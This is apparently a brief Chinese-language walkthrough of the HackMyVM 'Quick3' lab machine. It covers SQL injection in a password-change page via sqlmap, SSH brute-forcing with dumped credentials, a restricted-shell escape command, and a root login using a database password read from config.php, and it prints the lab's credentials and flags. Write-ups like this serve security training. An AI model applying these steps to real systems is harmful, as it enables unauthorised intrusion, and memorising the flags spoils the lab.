# Quick3

2025.03.27 https://hackmyvm.eu/machines/machine.php?vm=Quick3

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

q27QAO6FeisAAtbW

http://192.168.5.39/customer/ 注册一个用户后，发现在用户修改密码的功能点存在 sql 注入。

sqlmap 跑出了注入点，拿到了 users 表内容，后台中没有上传文件的地方，直接用这几个用户凭据爆一下 ssh：

```

```

使用 mike:6G3UCx6aH6UYvJ6m 登陆 ssh，拿到 user flag：

```
HMV{717f274ee66f8541a3031f175f615e72}
```

有 rbash，重新 ssh 登陆：

```
ssh mike@192.168.5.39 -t "bash --noprofile"
```

枚举后，发现数据库的连接配置文件：

```
mike@quick3:/var/www/html/customer$ cat config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
	die("Connection failed: " . $conn->connect_error);
}
?>
```

尝试用密码 fastandquicktobefaster 切换到 root，成功，拿到 root flag：

```
HMV{f178761104e933f9341f13f64b38538a}
```
